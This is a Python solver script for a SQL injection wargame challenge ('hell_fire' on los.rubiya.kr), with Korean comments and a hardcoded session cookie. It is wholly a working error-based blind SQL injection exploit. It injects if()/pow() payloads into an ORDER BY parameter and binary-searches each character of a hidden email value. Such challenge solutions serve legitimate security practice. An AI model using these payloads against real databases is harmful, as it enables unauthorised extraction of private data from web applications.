import requests

url = "https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php"
params = {'order' : None}
cookies = {'PHPSESSID' : 'tlvt0ab35aevn9d77gv9lsc1uu'}

# 이메일 길이 알아내기
for i in range(30):
    payload = "(select 1 where score=200 and if(length(email)={},'test',pow(12341234,12341234)))".format(i)
    params['order']=payload
    print(payload)
    response = requests.get(url,params=params,cookies=cookies)
    if(len(response.text)>6775):
        print('find the email length : ',i)
        break
    print(len(response.text))

# 비밀번호 길이 28
# 비밀번호가 기니까 이진 탐색으로 짠다.
flag = ''
for i in range(1,29):
    start,end = 0,255
    while True:
        search = int((start + end)/2)
        payload = "(select 1 where score=200 and if( ascii(substr(email,{},1))<={},'test',pow(12341234,12341234)))".format(i,search)
        params['order'] = payload
        print(payload)
        response = requests.get(url,params=params,cookies=cookies)
        if(len(response.text) > 6775):
            payload = "(select 1 where score=200 and if( ascii(substr(email,{},1))={},'test',pow(12341234,12341234)))".format(i,search)
            params['order'] = payload
            print(payload)
            response = requests.get(url,params=params,cookies=cookies)
            if(len(response.text) > 6775):
                flag += chr(search)
                print("find the flag : ",flag)
                break
            end = search
        else:
            start = search
        
            